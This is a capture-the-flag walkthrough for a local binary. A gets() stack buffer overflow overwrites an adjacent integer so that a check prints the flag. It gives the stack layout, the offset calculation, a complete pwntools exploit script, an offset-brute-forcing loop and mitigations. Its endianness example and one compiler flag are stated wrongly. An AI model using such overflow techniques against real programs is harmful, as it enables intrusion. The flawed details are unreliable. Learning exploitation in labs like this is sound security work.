# Local Target - CTF Walkthrough

## Challenge Overview
Buffer overflow to overwrite a local variable and pass a conditional check.

## Binary Info
```
Arch: x86-64
Protections: NX only
PIE: Disabled
Canary: Disabled
```

## Vulnerability

```c
int main(){
  char input[16];  // 16-byte buffer
  int num = 64;    // Local variable
  
  gets(input);     // OVERFLOW!
  
  if(num == 65){   // Need to change num to 65
    // Print flag
  }
}
```

The `gets()` call allows us to overflow `input` and overwrite `num`.

## Memory Layout

On the stack:
```
[input buffer - 16 bytes] [padding - 8 bytes] [num - 4 bytes]
```

To overwrite `num`, we need 24 bytes of padding, then our value.

## Exploitation

### Step 1: Understand Stack Layout

In 64-bit, variables are aligned. The layout is:
- `input[16]` at lower address
- Padding/alignment (8 bytes)
- `num` (4 bytes) at higher address

### Step 2: Calculate Offset

```python
# Test with gdb or trial
# input: 16 bytes
# padding: 8 bytes (alignment)
# Total: 24 bytes to reach num
```

### Step 3: Craft Payload

We need `num == 65` (ASCII 'A' = 0x41 = 65):

```python
payload = b'A' * 24 + b'\x41'  # 24 bytes padding + 0x41 (65)
```

Or for exact integer:
```python
payload = b'A' * 24 + p32(65)  # p32(65) = b'\x41\x00\x00\x00'
```

But single byte `\x41` works fine since we only need LSB to be 65.

## Complete Exploit

```python
from pwn import *

elf = context.binary = ELF("./local-target")
p = process()

# 24 bytes padding + value 65 (0x41)
payload = b'A' * 24 + b'\x41'

p.sendlineafter(b'Enter a string: ', payload)
p.interactive()
```

Output:
```
num is 65
You win!
CTF{your_flag_here}
```

## Why 24 Bytes?

```
input[0-15]   = 16 bytes
padding[16-23] = 8 bytes (compiler alignment)
num[24-27]    = 4 bytes
```

The compiler aligns variables, leaving 8 bytes of padding between `input` and `num`.

## Testing Offsets

If unsure about offset:
```python
# Test different offsets
for i in range(30):
    p = process()
    payload = b'A' * i + b'\x41'
    p.sendline(payload)
    output = p.recvall()
    if b'You win' in output:
        print(f"Success at offset: {i}")
    p.close()
```

## Key Concepts
- **Stack Variables**: Local variables stored on stack
- **Variable Alignment**: Compiler adds padding for alignment
- **Overflow Control**: Precisely overwrite specific variables
- **Little Endian**: LSB first (0x41000000 stored as 41 00 00 00)

## Variations

### Change num to different value:
```python
payload = b'A' * 24 + p32(desired_value)
```

### Overflow multiple variables:
If there were more variables after `num`, keep adding data.

## Mitigation
1. Use `fgets(input, sizeof(input), stdin)` instead of `gets()`
2. Enable stack canaries: `-fstack-protector-all`
3. Use compiler warnings: `-Wformat-security`
4. Modern compilers reject `gets()` entirely

## Quick Commands

```bash
# Test manually
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x41" | ./local-target

# Run exploit
python3 exploit.py
```
